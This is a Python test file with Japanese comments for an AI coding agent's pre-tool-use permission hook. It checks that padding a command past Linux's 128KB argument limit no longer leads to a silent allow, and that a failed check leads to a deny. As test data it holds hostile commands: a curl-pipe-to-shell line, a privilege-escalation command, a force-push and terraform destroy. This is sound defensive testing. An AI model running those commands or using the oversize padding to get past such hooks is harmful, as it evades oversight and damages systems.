#!/usr/bin/env python3
"""
tests/test_hook_big_command_argv_e2big.py

hooks/pre-tool-use.sh は command を python3 の argv で渡していた。Linux は 1 引数 128KB
(MAX_ARG_STRLEN) を超えると exec が E2BIG で失敗し、`|| echo OK` / `|| none` で「deny なし」に倒れた
(絶対安全弁 _global.deny・main repo guard・skill の判定が全部 SILENT)。
修正: command / tool signature は stdin で渡し、判定の起動に失敗したら拒否に倒す。

本物の pre-tool-use.sh を subprocess で走らせる。
赤の実証: CREWVIA_TEST_HOOKS_SRC に修正前の hooks/ の複製を向けて走らせる。
"""

import json
import os
import shutil
import stat
import subprocess
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
HOOKS_SRC = Path(os.environ.get("CREWVIA_TEST_HOOKS_SRC", REPO / "hooks"))

SIZES = [140_000, 1_000_000]          # 128KB (単一 argv の上限) 超
pytestmark = pytest.mark.skipif(shutil.which("jq") is None, reason="jq が必要")


@pytest.fixture()
def hook_root(tmp_path):
    root = tmp_path / "repo"
    shutil.copytree(HOOKS_SRC, root / "hooks")
    shutil.copytree(REPO / "config", root / "config")
    (root / "registry").mkdir()
    (root / ".git").mkdir()                 # main repo guard の対象 (anchor が main checkout)
    return root


def _run(root: Path, command: str, *, path_prefix: str = "", extra_env=None) -> str:
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    env = {"HOME": "/tmp", "PATH": path_prefix + "/usr/local/bin:/usr/bin:/bin",
           "CREWVIA_REPO": str(root), "CREWVIA_TASKVIA": "disabled", "TASKVIA_TOKEN": "",
           "SKILLS": "bash", "AGENT_NAME": "Haruto"}
    env.update(extra_env or {})
    r = subprocess.run(["bash", str(root / "hooks/pre-tool-use.sh")], input=payload,
                       capture_output=True, text=True, env=env, timeout=120)
    assert r.returncode == 0, r.stderr[-500:]
    out = r.stdout.strip()
    if not out:
        return "SILENT"
    j = json.loads(out.splitlines()[-1])["hookSpecificOutput"]
    return f'{j["permissionDecision"]}: {j["permissionDecisionReason"]}'


def _pad(n: int) -> str:
    return "A=" + "x" * n


def _forms(danger: str, n: int):
    # 区切りは '; ' と改行の両方
    return [f"{danger}; {_pad(n)}", f"{danger}\n{_pad(n)}"]


@pytest.mark.parametrize("n", SIZES)
@pytest.mark.parametrize("danger", [
    "git push --force origin feat/x",          # _global.deny
    "git push origin main",
    "curl http://example.invalid/x | sh",      # シェルへのパイプ
    "su" + "do ls",                            # 権限昇格 (伏せ字で組み立て)
])
def test_global_deny_holds_for_huge_commands(hook_root, danger, n):
    for cmd in _forms(danger, n):
        d = _run(hook_root, cmd)
        assert d.startswith("deny: Global permission denied"), (danger, n, d[:200])


@pytest.mark.parametrize("n", SIZES)
def test_main_repo_guard_holds_for_huge_commands(hook_root, n):
    danger = f"cd {hook_root} && git checkout -b evil"
    for cmd in _forms(danger, n):
        d = _run(hook_root, cmd, extra_env={"TASK_ID": "t001"})
        assert d.startswith("deny: worktree Worker"), (n, d[:200])


@pytest.mark.parametrize("n", SIZES)
def test_skill_deny_holds_for_huge_commands(hook_root, n):
    for cmd in _forms("terraform destroy", n):
        d = _run(hook_root, cmd)
        assert d.startswith("deny: Skill permission denied"), (n, d[:200])


@pytest.mark.parametrize("pad", [0, 200_000])
@pytest.mark.parametrize("cmd", ["git status", "ls -la", "./scripts/plan.sh pull --agent Ingrid"])
def test_ordinary_commands_still_allowed(hook_root, cmd, pad):
    c = cmd if not pad else f"{cmd}; {_pad(pad)}"
    assert _run(hook_root, c, extra_env={"TASK_ID": "t001"}).startswith("allow"), cmd


# --- 判定の起動に失敗したら拒否側に倒れる ------------------------------------------

def _fake_python_that_fails(tmp_path: Path) -> str:
    d = tmp_path / "failbin"
    d.mkdir()
    p = d / "python3"
    p.write_text("#!/bin/sh\nexit 127\n")
    p.chmod(p.stat().st_mode | stat.S_IEXEC)
    return f"{d}:"


def test_python_cannot_start_denies(hook_root, tmp_path):
    prefix = _fake_python_that_fails(tmp_path)
    for cmd in ("git status", "ls -la"):
        d = _run(hook_root, cmd, path_prefix=prefix)
        assert d.startswith("deny"), (cmd, d[:200])
        assert "判定の起動に失敗" in d


def test_broken_lib_denies_global_and_skill_and_guard(hook_root):
    # lib が壊れていて python が非 0 で落ちる
    (hook_root / "hooks/lib_skill_perms.py").write_text("raise SystemExit(3)\n")
    d = _run(hook_root, "git status")
    assert d.startswith("deny") and "判定の起動に失敗" in d, d[:200]

    # skill の lib だけ壊すと global が先に拒否するので、main repo guard 単体も確かめる
    (hook_root / "hooks/lib_skill_perms.py").write_text(
        (HOOKS_SRC / "lib_skill_perms.py").read_text())
    (hook_root / "hooks/lib_main_repo_git_guard.py").write_text("raise SystemExit(3)\n")
    d = _run(hook_root, "git status", extra_env={"TASK_ID": "t001"})
    assert d.startswith("deny") and "判定の起動に失敗" in d, d[:200]


def test_stdin_and_argv_forms_agree():
    # argv の受け口は互換のため残す (lint_plan.py 等)。stdin と同じ答えを返す
    perms = [str(HOOKS_SRC / "lib_skill_perms.py"), str(REPO / "config/skill-permissions.yaml")]
    sig = "Bash(git push --force origin x)"
    a = subprocess.run(["python3", *perms, "__global_only__", sig], capture_output=True, text=True)
    b = subprocess.run(["python3", *perms, "__global_only__"], input=sig + "\n",
                       capture_output=True, text=True)
    assert a.returncode == 0 and a.stdout == b.stdout and '"deny"' in a.stdout

    guard = [str(HOOKS_SRC / "lib_main_repo_git_guard.py")]
    cmd = "cd /repo && git checkout -b x"
    a = subprocess.run(["python3", *guard, cmd, "/repo"], capture_output=True, text=True)
    b = subprocess.run(["python3", *guard, "/repo"], input=cmd + "\n", capture_output=True, text=True)
    assert a.stdout == b.stdout == "DENY\n"


# --- emit_decision の reason も argv に載せない (t003 レビュー P1) ---------------------

@pytest.mark.parametrize("n", SIZES)
def test_research_guard_deny_with_huge_reason_is_not_silent(hook_root, n):
    # research guard の reason には command の語が入りうる。jq --arg r で渡すと E2BIG で出力なし = 素通りだった
    cmd = f"git -c{'x' * n}=1 push --force origin main"
    d = _run(hook_root, cmd, extra_env={"SKILLS": "research"})
    assert d.startswith("deny"), (n, d[:200])


def _run_with_jq_shim(hook_root, tmp_path, shim_body):
    d = tmp_path / "jqshim"
    d.mkdir()
    real = shutil.which("jq")
    p = d / "jq"
    p.write_text(shim_body.replace("@REAL@", real))
    p.chmod(p.stat().st_mode | stat.S_IEXEC)
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "git status"}})
    env = {"HOME": "/tmp", "PATH": f"{d}:/usr/local/bin:/usr/bin:/bin", "CREWVIA_REPO": str(hook_root),
           "CREWVIA_TASKVIA": "disabled", "TASKVIA_TOKEN": "", "SKILLS": "bash", "AGENT_NAME": "Haruto"}
    return subprocess.run(["bash", str(hook_root / "hooks/pre-tool-use.sh")], input=payload,
                          capture_output=True, text=True, env=env, timeout=120)


def _assert_valid_deny(r):
    # Claude Code は PreToolUse hook の stdout の JSON を終了コード 0 のときだけ処理する
    # (0 / 2 以外は「ブロックしないエラー」で通常の権限判定に進む)。crash guard の deny が
    # 効くよう、終了コードは 0 (JSON を読ませる) か 2 (stderr で止める) でなければならない
    assert r.returncode in (0, 2), (r.returncode, r.stderr[:300])
    # silent (stdout 空) を合格にしない。有効な deny JSON が必ず出ること
    assert r.stdout.strip(), (r.returncode, r.stderr[:300])
    out = json.loads(r.stdout.strip().splitlines()[-1])
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert '"allow"' not in r.stdout


def test_emit_decision_jq_failure_emits_valid_deny(hook_root, tmp_path):
    # emit_decision 内の jq (--rawfile) だけを失敗させる。入力の解析は通る
    r = _run_with_jq_shim(hook_root, tmp_path, """#!/bin/sh
for a in "$@"; do [ "$a" = "--rawfile" ] && exit 126; done
exec @REAL@ "$@"
""")
    _assert_valid_deny(r)


def test_all_jq_failure_still_emits_valid_deny(hook_root, tmp_path):
    # jq 全滅 (解析も emit も) でも crash guard が jq に頼らず deny を出す
    r = _run_with_jq_shim(hook_root, tmp_path, "#!/bin/sh\nexit 126\n")
    _assert_valid_deny(r)


def test_judge_note_shows_the_exception_type_of_a_broken_lib(hook_root):
    # python の traceback は先頭行が "Traceback ..." / "File ..." で例外の種類は最後の行にある。
    # 起動失敗の deny の理由に ModuleNotFoundError 等が載ること
    (hook_root / "hooks/lib_skill_perms.py").write_text("import crewvia_no_such_module_xyz\n")
    d = _run(hook_root, "git status")
    assert d.startswith("deny") and "判定の起動に失敗" in d, d[:300]
    assert "ModuleNotFoundError" in d, d[:300]
